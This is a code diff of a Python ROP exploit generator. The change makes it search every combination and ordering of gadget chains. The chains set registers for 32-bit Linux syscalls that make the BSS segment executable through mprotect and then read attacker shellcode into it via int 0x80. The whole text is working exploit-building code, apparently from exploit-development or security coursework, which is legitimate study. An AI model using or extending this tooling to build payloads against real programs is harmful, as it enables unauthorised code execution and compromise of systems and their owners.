@@ -1,7 +1,7 @@
 import sys
 from os import stat
 from struct import pack
-from itertools import permutations
+from itertools import permutations, product
 
 import address_pop
 import exploit_gadgets
@@ -20,16 +20,20 @@ def valid(elem, rest):
     exit()
 
 def schedule(commands):
-    # print(commands)[0]
-    for order in permutations(commands.items()):
-        for i in range(1,len(order)):
-            if not valid(order[i],order[:i]):
-                break
-        else:
-            exploit = b""
-            for elem in order:
-                exploit += elem[1][0]
-            return exploit
+    # Iterate over every possible combination of gadget chains for each register
+    for gadgets in product(*commands.values()):
+        choice = {list(commands.keys())[i] : gadgets[i] for i in range(len(gadgets))}
+        # Iterate over every possible ordering of the given combination
+        for order in permutations(choice.items()):
+            for i in range(1,len(order)):
+                if not valid(order[i],order[:i]):
+                    break
+            else:
+                # If the loop terminates normally, then this is a valid combo + ordering
+                exploit = b""
+                for elem in order:
+                    exploit += elem[1][0]
+                return exploit
 
     print("No valid order!")
     return -1
@@ -50,10 +54,10 @@ def rop_exploit():
 
     shellcode_len = stat(sys.argv[1]).st_size
     
-    commands = {"eax" : push_to_reg(0x0000007D,"eax",gadgets,rop)[0],    
-                "ebx" : push_to_reg(bss,"ebx",gadgets,rop)[0],
-                "ecx" : push_to_reg(0x0000800,"ecx",gadgets,rop)[0],
-                "edx" : push_to_reg(0x0000007,"edx",gadgets,rop)[0]}
+    commands = {"eax" : push_to_reg(0x0000007D,"eax",gadgets,rop),    
+                "ebx" : push_to_reg(bss,"ebx",gadgets,rop),
+                "ecx" : push_to_reg(0x0000800,"ecx",gadgets,rop),
+                "edx" : push_to_reg(0x0000007,"edx",gadgets,rop)}
 
     exploit += schedule(commands)
     exploit += INT80 # int 0x80
@@ -63,10 +67,10 @@ def rop_exploit():
 
     # BSS is now executable
     # # Read into BSS
-    commands = {"eax" : push_to_reg(3,"eax",gadgets,rop)[0],
-                "ebx" : push_to_reg(0,"ebx",gadgets,rop)[0],
-                "ecx" : push_to_reg(bss,"ecx",gadgets,rop)[0], 
-                "edx" : push_to_reg(shellcode_len,"edx",gadgets,rop)[0]}
+    commands = {"eax" : push_to_reg(3,"eax",gadgets,rop),
+                "ebx" : push_to_reg(0,"ebx",gadgets,rop),
+                "ecx" : push_to_reg(bss,"ecx",gadgets,rop), 
+                "edx" : push_to_reg(shellcode_len,"edx",gadgets,rop)}
 
     
     exploit += schedule(commands)
